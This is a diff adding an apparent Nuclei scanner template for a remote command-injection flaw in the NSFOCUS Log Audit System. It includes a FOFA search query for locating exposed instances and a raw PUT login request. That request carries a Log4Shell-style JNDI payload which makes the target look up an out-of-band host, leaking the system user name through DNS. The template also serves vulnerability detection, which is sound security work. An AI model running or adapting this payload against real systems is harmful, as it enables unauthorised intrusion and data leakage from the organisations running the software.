@@ -1,0 +1,31 @@
+id: nsfocus-log-rce
+info:
+  name: NSFOCUS Log Audit System 命令注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: "<title>{{platformName}}</title>" && icon_hash="-1566499661"
+          NsFOCUS Log Audit System（简称NSFOCUS LAS）作为基于大数据架构的日志管理平台，具备海量日志采集、异构设备日志标准化处理及安全事件关联分析能力，实现日志全生命周期管控。该系统通过多阶段安全事件监控（风险识别、溯源分析及取证调查）支持企业满足《网络安全法》和等级保护合规要求。
+  tags: 绿盟日志审计系统
+http:
+- raw:
+  - |
+    PUT /api/v1/login HTTP/1.1
+    Host: {{Hostname}}
+    Connection: keep-alive
+    Accept: application/json, text/plain, */*
+    Content-Type: application/json;charset=UTF-8
+    Accept-Language: zh_CN
+    Accept-Encoding: gzip, deflate, br
+    Cookie: JSESSIONID=C2CBDF46F7B53365D2ECE60AA645B673; sessionid=w0gr7fyrkt56tf6yc3sr0pw6mjl59txi
+
+    {"name":"${jndi:ldap://${sys:user.name}.{{interactsh-url}}}","password":"2Y4W5F5h"}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 400
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
